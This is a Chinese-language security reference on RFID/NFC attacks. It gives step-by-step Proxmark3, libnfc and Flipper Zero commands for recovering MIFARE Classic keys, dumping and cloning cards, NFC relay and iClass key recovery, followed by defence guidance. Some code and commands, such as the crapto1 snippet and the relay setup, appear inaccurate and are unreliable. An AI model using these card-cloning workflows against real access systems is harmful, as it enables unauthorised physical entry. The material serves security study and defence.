# RFID-NFC安全

## 概述

RFID（射频识别）和NFC（近场通信）技术广泛用于门禁系统、支付卡、公共交通、身份识别和供应链管理。MIFARE Classic是最广泛部署的RFID卡标准，但其专有加密算法CRYPTO1已被完全破解。NFC（基于RFID的13.56MHz标准）面临中继攻击、数据嗅探和克隆攻击。

## RFID基础知识

### 频率与标准

| 频段 | 频率范围 | 读取距离 | 典型应用 |
|------|----------|----------|----------|
| LF低频 | 125-134 kHz | 10cm | 动物芯片、门禁 |
| HF高频 | 13.56 MHz | 10cm-1m | MIFARE、NFC、支付卡 |
| UHF超高频 | 860-960 MHz | 1-12m | 物流、库存管理 |
| 微波 | 2.45-5.8 GHz | 1-2m | 收费系统、集装箱 |

### MIFARE系列对比

| 型号 | 加密算法 | 安全状态 | 存储 | 用途 |
|------|----------|----------|------|------|
| MIFARE Classic 1K | CRYPTO1 | 已破解 | 1KB EEPROM | 门禁、交通卡 |
| MIFARE Classic 4K | CRYPTO1 | 已破解 | 4KB EEPROM | 更大容量需求 |
| MIFARE Plus | AES-128 | 安全 | 2-4KB | 经典升级方案 |
| MIFARE DESFire EV1 | 3DES/AES | 安全 | 2-8KB | 支付、交通 |
| MIFARE DESFire EV2 | AES-128 | 安全 | 2-8KB | 最高安全等级 |
| MIFARE Ultralight | 无加密 | 不安全 | 64-256B | 单次票务 |

## MIFARE Classic攻击

MIFARE Classic使用NXP专有的CRYPTO1流密码，2008年被完全逆向工程。

### CRYPTO1算法弱点

```text
# CRYPTO1已知弱点
1. 48位密钥（实际有效强度约16位）
2. 线性反馈移位寄存器（LFSR）结构简单
3. 认证协议泄露密钥流
4. 随机数生成器可预测
5. 无相互认证（只有卡认证读卡器）

# 密钥恢复方法
1. 嵌套认证攻击：从已知密钥获取新密钥
2. 硬编码密钥列表（如000000000000, FFFFFFFFFFFF）
3. 密钥A通常设置为FFFFFFFFFFFF
```

### 使用Proxmark3攻击MIFARE Classic

```bash
# Proxmark3操作流程

# 1. 探测卡片
proxmark3> hf mf search

# 2. 硬编码密钥尝试
proxmark3> hf mf mifare

# 3. 嵌套认证攻击（从已知扇区密钥恢复未知扇区）
proxmark3> hf mf nested 1 A KNOWN_KEY 4 A

# 4. 自动全卡密钥恢复
proxmark3> hf mf autopwn

# 5. Darkside攻击（针对CRYPTO1的特定攻击）
proxmark3> hf mf darkside

# 6. 读取全部数据
proxmark3> hf mf dump

# 7. 克隆卡片
proxmark3> hf mf restore
```

### 使用libnfc攻击MIFARE

```bash
# 使用libnfc + mfoc执行嵌套攻击
mfoc -O dump.mfd -P 000 -k FFFFFFFFFFFF

# 使用mfcuk执行Darkside攻击
mfcuk -C -R 0:A -s 250 -S 250 -v 3

# 读取卡片全部数据
nfc-mfclassic r dump.mfd
nfc-mfclassic r dump.mfd f A A

# 写入（克隆）
nfc-mfclassic w dump.mfd
```

### Python攻击脚本（crapto1库）

```python
# 使用Crapto1库计算MIFARE密钥
from crapto1 import cryptol, lfsr_rollback

# 已知的随机数和密钥流
# 从认证过程捕获
nt = 0x12345678  # 卡随机数
nr = 0x87654321  # 读卡器随机数
ar = 0xAABBCCDD  # 卡响应（密钥流）

# 恢复内部状态
state = lfsr_rollback(nr, nt, ar)
print(f"Recovered state: {state:016x}")

# 输出48位密钥
key = cryptol.crypto1_get_key(state)
print(f"Recovered key: {key:012x}")
```

## NFC攻击

### 数据嗅探

```bash
# 使用Proxmark3嗅探NFC通信
proxmark3> hf 14a sniff

# 使用Android设备嗅探
# 下载NFC TagInfo或NFC Reader工具

# 使用专用的NFC嗅探硬件
# LucidNFC - 开源NFC嗅探器
# WireShark + NFC分析插件
```

### 中继攻击

```bash
# 中继攻击原理
# 攻击者A：靠近受害者，转发其卡片信息
# 攻击者B：靠近读卡器，模拟受害者卡片

# 使用两个Proxmark3进行中继
# Proxmark3 A（靠近卡片）
proxmark3> hf mf sim x 4 FFFFFFFFFFFF

# Proxmark3 B（靠近读卡器）
proxmark3> hf mf sniff

# 使用libnfc的中继实现
# nfc-relay - 开源NFC中继工具
nfc-relay -m relay

# 使用NFCProxy（Android）
# 需要Root权限和NFCProxy app
```

### 支付卡攻击

```text
# 非接触式支付安全
- Visa payWave: 动态CVV，交易限额
- MasterCard PayPass: 动态CVC3，交易限额
- AmEx ExpressPay: 动态Token
- 银联闪付: 小额免密

# 已知攻击
1. 金额篡改：修改交易数据（需要破解加密）
2. 重放攻击：重复发送相同交易（有防重放计数器）
3. 小额免密滥用：连续免密交易（有累计限额）
4. 信息泄露：读取卡号、有效期（大多数仅公开必要信息）
```

## HID iClass攻击

HID iClass是广泛使用的门禁系统，使用专有密钥派生算法：

```bash
# iClass安全分析
# 密钥派生算法（KDA）已在2010年被逆向

# 使用Proxmark3攻击HID iClass
proxmark3> hf iclass loclass  # 密钥恢复攻击

# 克隆iClass卡
proxmark3> hf iclass sim

# iClass SE（安全增强版本）
# 使用AES-128加密
# 但仍存在配置错误风险
```

## 硬件工具对比

| 工具 | 频率范围 | 功能特点 | 价格 |
|------|----------|----------|------|
| Proxmark3 RDV4 | LF+HF | MIFARE全破解、iClass、ISO15693 | ~300 USD |
| ChameleonMini | 13.56 MHz | NFC模拟器，多标准支持 | ~50 USD |
| Flipper Zero | LF+HF | 多功能硬件，GPIOMIFARE | ~200 USD |
| HackRF | 1MHz-6GHz | SDR平台，RFID解码 | ~300 USD |
| RTL-SDR | 24-1766MHz | 低成本SDR，UHF RFID | ~25 USD |
| USB NFC读写器 | 13.56 MHz | ACR122U等，libnfc兼容 | ~30-50 USD |

### Flipper Zero RFID操作

```bash
# 读取低频卡
# 将低频天线靠近卡片
# 选择125kHz → Read

# 读取高频卡
# 选择13.56MHz → Read
# 检测MIFARE Classic时尝试默认密钥

# 模拟卡片
# Read Card → Save → Emulate

# 保存的卡片数据
# /sdcard/nfc/
```

## 防御措施

### 卡片升级路线

```text
# MIFARE Classic迁移路径
1. MIFARE Plus + Security Level 3 (AES加密)
2. MIFARE DESFire EV2 + AES-128
3. 支持PICC认证（卡片认证读卡器）

# 推荐的最小安全配置
- AES-128加密
- 相互认证
- 安全的密钥管理方案
- 防克隆措施（卡片唯一ID + 密钥绑定）

# 门禁系统升级
1. 逐步淘汰MIFARE Classic
2. 部署OSDP（开放式监控设备协议）
3. 使用移动凭证（Apple Wallet/Google Pay）
```

### 防范中继攻击

```text
# 中继攻击防御
1. 距离限制协议（Distance Bounding）
2. 对交易耗时进行监控（中继增加延迟）
3. 使用GPS/基站位置验证
4. 生物特征二次验证
5. 移动设备中检查设备位置和用户验证

# 支付卡防护
1. 使用NFC屏蔽卡套/钱包
2. 非接触式交易限额设置
3. 银行侧异常交易检测
4. 交易次数限制
```

### 密钥管理

```text
# 安全密钥管理原则
1. 每个站点的密钥唯一
2. 密钥定期轮换
3. 安全硬件存储（HSM/SE）
4. 最小权限（每个扇区独立密钥）
5. 密钥不使用出厂默认值（FFFFFFFFFFFF）
6. 密钥加载使用安全通道

# 读卡器安全
1. 读卡器固件定期更新
2. 使用安全元件（SE）存储密钥
3. 读卡器认证（防止更换读卡器）
4. 通信链路加密
```

## 参考资源

- [Proxmark3](https://github.com/RfidResearchGroup/proxmark3)
- [Flipper Zero](https://flipperzero.one/)
- [libnfc](https://github.com/nfc-tools/libnfc)
- [ChameleonMini](https://github.com/emsec/ChameleonMini)
- [MIFARE Security Analysis](https://www.usenix.org/legacy/event/ss08/tech/full_papers/nohl/nohl.pdf)
- [OWASP NFC Security](https://owasp.org/www-project-mobile-security-testing-guide/)
